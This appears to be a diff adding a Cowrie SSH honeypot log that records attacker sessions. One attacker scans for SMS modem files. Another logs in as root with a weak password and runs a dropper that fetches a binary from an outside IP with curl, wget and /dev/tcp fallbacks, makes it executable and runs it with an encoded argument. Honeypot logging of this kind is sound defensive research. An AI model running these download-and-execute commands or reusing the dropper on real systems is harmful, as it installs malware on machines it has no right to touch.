@@ -1,0 +1,101 @@
+2023-11-27T04:04:03+0000	[-] Python Version 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]	Unnamed: 2	Unnamed: 3	Unnamed: 4
+2023-12-01T01:31:18+0000	[HoneyPotSSHTransport,43,59.12.233.183] Closing TTY Log: var/lib/cowrie/tty/e5cefcb1b141654b896106c8d	c7	8ae	972511ca8772b28e593dbe256993fa8437 after 0 seconds
+2023-12-01T01:31:18+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] remote close			
+2023-12-01T01:31:18+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
+2023-12-01T01:31:18+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
+2023-12-01T01:31:18+0000	"[twisted.conch.ssh.session#info] Executing command ""b'ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool"	/s	ms/	"* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*'"""
+2023-12-01T01:31:18+0000	[SSHChannel session (6) on SSHService b'ssh-connection' on HoneyPotSSHTransport,43,59.12.233.183] CMD	:	ls	-la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2023-12-01T01:31:18+0000	[SSHChannel session (6) on SSHService b'ssh-connection' on HoneyPotSSHTransport,43,59.12.233.183] Com	ma	nd	found: ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2023-12-01T01:31:18+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-12-01T01:31:18+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
+2023-12-01T01:31:18+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 6			
+2023-12-01T01:31:18+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-12-01T01:31:18+0000	[HoneyPotSSHTransport,43,59.12.233.183] Closing TTY Log: var/lib/cowrie/tty/baaa3eb1b4234e92bb652c299	22	77b	87dbe17c9080a5f6d842fc72563087dbd8 after 0 seconds
+2023-12-01T01:31:18+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] remote close			
+2023-12-01T01:31:18+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
+2023-12-01T01:31:18+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
+2023-12-01T01:31:19+0000	"[twisted.conch.ssh.session#info] Executing command ""b'echo Hi | cat -n'"""			
+2023-12-01T01:31:19+0000	[SSHChannel session (7) on SSHService b'ssh-connection' on HoneyPotSSHTransport,43,59.12.233.183] CMD	:	ech	o Hi | cat -n
+2023-12-01T01:31:19+0000	[SSHChannel session (7) on SSHService b'ssh-connection' on HoneyPotSSHTransport,43,59.12.233.183] Com	ma	nd	found: cat -n
+2023-12-01T01:31:19+0000	[SSHChannel session (7) on SSHService b'ssh-connection' on HoneyPotSSHTransport,43,59.12.233.183] Com	ma	nd	found: echo Hi
+2023-12-01T01:31:19+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-12-01T01:31:19+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
+2023-12-01T01:31:19+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 7			
+2023-12-01T01:31:19+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-12-01T01:31:19+0000	[HoneyPotSSHTransport,43,59.12.233.183] Closing TTY Log: var/lib/cowrie/tty/3e8341eade715d716ae9fe37d	b3	80f	b9cab5f953782fe691fcf3af29041a344e after 0 seconds
+2023-12-01T01:31:19+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] remote close			
+2023-12-01T01:32:20+0000	[HoneyPotSSHTransport,43,59.12.233.183] Got remote error, code 11 reason: b'disconnected by user'			
+2023-12-01T01:32:20+0000	[HoneyPotSSHTransport,43,59.12.233.183] avatar root logging out			
+2023-12-01T01:32:20+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
+2023-12-01T01:32:20+0000	[HoneyPotSSHTransport,43,59.12.233.183] Connection lost after 70 seconds			
+2023-12-01T02:04:35+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1			
+2023-12-01T02:04:35+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256			
+2023-12-01T02:04:35+0000	[cowrie.ssh.factory.CowrieSSHFactory] New connection: 123.57.246.171:33780 (172.17.0.2:2222) [session	:	76b	796aa8f63]
+2023-12-01T02:04:35+0000	[HoneyPotSSHTransport,44,123.57.246.171] Remote SSH version: SSH-2.0-makiko			
+2023-12-01T02:04:35+0000	[HoneyPotSSHTransport,44,123.57.246.171] SSH client hassh fingerprint: 2f5ebb184f5d02324eed9a822f5259	dc		
+2023-12-01T02:04:35+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ssh-ed25519'			
+2023-12-01T02:04:35+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
+2023-12-01T02:04:35+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'			
+2023-12-01T02:04:38+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
+2023-12-01T02:04:38+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
+2023-12-01T02:04:39+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'			
+2023-12-01T02:04:39+0000	[HoneyPotSSHTransport,44,123.57.246.171] Could not read etc/userdb.txt, default database activated			
+2023-12-01T02:04:39+0000	[HoneyPotSSHTransport,44,123.57.246.171] login attempt [b'root'/b'123456'] failed			
+2023-12-01T02:04:40+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'			
+2023-12-01T02:04:40+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
+2023-12-01T02:04:41+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'			
+2023-12-01T02:04:41+0000	[HoneyPotSSHTransport,44,123.57.246.171] Could not read etc/userdb.txt, default database activated			
+2023-12-01T02:04:41+0000	[HoneyPotSSHTransport,44,123.57.246.171] login attempt [b'root'/b'12345678'] succeeded			
+2023-12-01T02:04:41+0000	[HoneyPotSSHTransport,44,123.57.246.171] Initialized emulated server as architecture: linux-x64-lsb			
+2023-12-01T02:04:41+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'			
+2023-12-01T02:04:41+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'			
+2023-12-01T02:04:43+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
+2023-12-01T02:04:43+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
+2023-12-01T02:04:43+0000	[twisted.conch.ssh.session#info] Getting shell			
+2023-12-01T02:04:44+0000	[HoneyPotSSHTransport,44,123.57.246.171] CMD: echo 1 && cat /bin/echo			
+2023-12-01T02:04:44+0000	[HoneyPotSSHTransport,44,123.57.246.171] Command found: echo 1			
+2023-12-01T02:04:44+0000	[HoneyPotSSHTransport,44,123.57.246.171] Command found: cat /bin/echo			
+2023-12-01T02:04:50+0000	"[HoneyPotSSHTransport,44,123.57.246.171] CMD: nohup $SHELL -c ""curl http://8.217.0.228:60140/linux -o"	/	tmp	"/RPZDFdg3Hv; if [ ! -f /tmp/RPZDFdg3Hv ]; then wget http://8.217.0.228:60140/linux -O /tmp/RPZDFdg3Hv; fi; if [ ! -f /tmp/RPZDFdg3Hv ]; then exec 6<>/dev/tcp/8.217.0.228/60140 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/RPZDFdg3Hv && chmod +x /tmp/RPZDFdg3Hv && /tmp/RPZDFdg3Hv 0raWZsiHtuhTlvI17pVN6L+A1mSQpr+qpoxk0Zi07E+K8jP3nkvptITfdZalsa6lkHvXg7X3TJz0OvaUTOqxlt57kKensaeWY8iHv+9NlfE14JBK97SG1XuXrrGupJhj1oe36l2R+C7ykEz3t4bXe5CkqaWgkmTVj6XoSJDuOPKKReyrhNRlmKCvrqSbddeHtPdIl+438IpM7bKM0GWTpqa/opF714W390yR8C7xnEnjs4bXZpa2ra2ljGzemLThRIrxMfCeS+m0gtF1lqGxqKCMYd+YtOFNnvYw8ZZE+bSH13ubuK6upIxn1IW/702V8TXgnFPrtIHIZYykraeslGXXgrX5TJTzLvKWS/e3g9Z7k6WrpaCSZNaEpehKkO45+YpM7LyY12yWrKmvp5JnxoKy90+Q8i7yl0X3tILSb5Smrq2mgmTXgavhRYr0N+6TROOzhtdlmraurqSMYNeYvPdFk/o28JVJ4KWH1GaMo6ixpJZjyIey6EeS8DHznF3otIHIZJegsaaijGHXjLPpTJT0IPKVRPe0hd97laSxraKab9CGtOtNhPEx+IpJ7auP03uapKWpppNl0pa24FOV9jXulUXuq4feZpigr66ll3XXh7f3T5X3LviQU+i3jNBlk6euv6eVYciPvPdMkfku8Z1J47OG12WQtq6ur4xk3oWr6Eyc7jH2kUfvtYfWYoKirLGnl2DIh73qU5bxMPqSTei2j8Zhm7itrKKMbNGYt+hJnvYw8ZRL+beE1HuToayxp5tsyIe87keS8DHzlV3tspjRY4ylqLGkkWPcgLXoTJGGZgL+S2efTGH3fsS+UxyVGtGtq6DwGSs8; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/RPZDFdg3Hv && /tmp/RPZDFdg3Hv 0raWZsiHtuhTlvI17pVN6L+A1mSQpr+qpoxk0Zi07E+K8jP3nkvptITfdZalsa6lkHvXg7X3TJz0OvaUTOqxlt57kKensaeWY8iHv+9NlfE14JBK97SG1XuXrrGupJhj1oe36l2R+C7ykEz3t4bXe5CkqaWgkmTVj6XoSJDuOPKKReyrhNRlmKCvrqSbddeHtPdIl+438IpM7bKM0GWTpqa/opF714W390yR8C7xnEnjs4bXZpa2ra2ljGzemLThRIrxMfCeS+m0gtF1lqGxqKCMYd+YtOFNnvYw8ZZE+bSH13ubuK6upIxn1IW/702V8TXgnFPrtIHIZYykraeslGXXgrX5TJTzLvKWS/e3g9Z7k6WrpaCSZNaEpehKkO45+YpM7LyY12yWrKmvp5JnxoKy90+Q8i7yl0X3tILSb5Smrq2mgmTXgavhRYr0N+6TROOzhtdlmraurqSMYNeYvPdFk/o28JVJ4KWH1GaMo6ixpJZjyIey6EeS8DHznF3otIHIZJegsaaijGHXjLPpTJT0IPKVRPe0hd97laSxraKab9CGtOtNhPEx+IpJ7auP03uapKWpppNl0pa24FOV9jXulUXuq4feZpigr66ll3XXh7f3T5X3LviQU+i3jNBlk6euv6eVYciPvPdMkfku8Z1J47OG12WQtq6ur4xk3oWr6Eyc7jH2kUfvtYfWYoKirLGnl2DIh73qU5bxMPqSTei2j8Zhm7itrKKMbNGYt+hJnvYw8ZRL+beE1HuToayxp5tsyIe87keS8DHzlV3tspjRY4ylqLGkkWPcgLXoTJGGZgL+S2efTGH3fsS+UxyVGtGtq6DwGSs8"" &"
+2023-12-01T02:04:50+0000	[HoneyPotSSHTransport,44,123.57.246.171] Command found: nohup /bin/bash -c curl http://8.217.0.228:60	14	0/l	inux -o /tmp/RPZDFdg3Hv; if [ ! -f /tmp/RPZDFdg3Hv ]; then wget http://8.217.0.228:60140/linux -O /tmp/RPZDFdg3Hv; fi; if [ ! -f /tmp/RPZDFdg3Hv ]; then exec 6<>/dev/tcp/8.217.0.228/60140 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/RPZDFdg3Hv && chmod +x /tmp/RPZDFdg3Hv && /tmp/RPZDFdg3Hv 0raWZsiHtuhTlvI17pVN6L+A1mSQpr+qpoxk0Zi07E+K8jP3nkvptITfdZalsa6lkHvXg7X3TJz0OvaUTOqxlt57kKensaeWY8iHv+9NlfE14JBK97SG1XuXrrGupJhj1oe36l2R+C7ykEz3t4bXe5CkqaWgkmTVj6XoSJDuOPKKReyrhNRlmKCvrqSbddeHtPdIl+438IpM7bKM0GWTpqa/opF714W390yR8C7xnEnjs4bXZpa2ra2ljGzemLThRIrxMfCeS+m0gtF1lqGxqKCMYd+YtOFNnvYw8ZZE+bSH13ubuK6upIxn1IW/702V8TXgnFPrtIHIZYykraeslGXXgrX5TJTzLvKWS/e3g9Z7k6WrpaCSZNaEpehKkO45+YpM7LyY12yWrKmvp5JnxoKy90+Q8i7yl0X3tILSb5Smrq2mgmTXgavhRYr0N+6TROOzhtdlmraurqSMYNeYvPdFk/o28JVJ4KWH1GaMo6ixpJZjyIey6EeS8DHznF3otIHIZJegsaaijGHXjLPpTJT0IPKVRPe0hd97laSxraKab9CGtOtNhPEx+IpJ7auP03uapKWpppNl0pa24FOV9jXulUXuq4feZpigr66ll3XXh7f3T5X3LviQU+i3jNBlk6euv6eVYciPvPdMkfku8Z1J47OG12WQtq6ur4xk3oWr6Eyc7jH2kUfvtYfWYoKirLGnl2DIh73qU5bxMPqSTei2j8Zhm7itrKKMbNGYt+hJnvYw8ZRL+beE1HuToayxp5tsyIe87keS8DHzlV3tspjRY4ylqLGkkWPcgLXoTJGGZgL+S2efTGH3fsS+UxyVGtGtq6DwGSs8; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/RPZDFdg3Hv && /tmp/RPZDFdg3Hv 0raWZsiHtuhTlvI17pVN6L+A1mSQpr+qpoxk0Zi07E+K8jP3nkvptITfdZalsa6lkHvXg7X3TJz0OvaUTOqxlt57kKensaeWY8iHv+9NlfE14JBK97SG1XuXrrGupJhj1oe36l2R+C7ykEz3t4bXe5CkqaWgkmTVj6XoSJDuOPKKReyrhNRlmKCvrqSbddeHtPdIl+438IpM7bKM0GWTpqa/opF714W390yR8C7xnEnjs4bXZpa2ra2ljGzemLThRIrxMfCeS+m0gtF1lqGxqKCMYd+YtOFNnvYw8ZZE+bSH13ubuK6upIxn1IW/702V8TXgnFPrtIHIZYykraeslGXXgrX5TJTzLvKWS/e3g9Z7k6WrpaCSZNaEpehKkO45+YpM7LyY12yWrKmvp5JnxoKy90+Q8i7yl0X3tILSb5Smrq2mgmTXgavhRYr0N+6TROOzhtdlmraurqSMYNeYvPdFk/o28JVJ4KWH1GaMo6ixpJZjyIey6EeS8DHznF3otIHIZJegsaaijGHXjLPpTJT0IPKVRPe0hd97laSxraKab9CGtOtNhPEx+IpJ7auP03uapKWpppNl0pa24FOV9jXulUXuq4feZpigr66ll3XXh7f3T5X3LviQU+i3jNBlk6euv6eVYciPvPdMkfku8Z1J47OG12WQtq6ur4xk3oWr6Eyc7jH2kUfvtYfWYoKirLGnl2DIh73qU5bxMPqSTei2j8Zhm7itrKKMbNGYt+hJnvYw8ZRL+beE1HuToayxp5tsyIe87keS8DHzlV3tspjRY4ylqLGkkWPcgLXoTJGGZgL+S2efTGH3fsS+UxyVGtGtq6DwGSs8 &
+2023-12-01T02:04:50+0000	[HoneyPotSSHTransport,44,123.57.246.171] CMD: head -c 2385132 > /tmp/9ahvZ8ULJC			
+2023-12-01T02:04:50+0000	[HoneyPotSSHTransport,44,123.57.246.171] Command found: head -c 2385132 > /tmp/9ahvZ8ULJC			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xd8'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xd7'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xe1'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-12-01T02:04:51+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
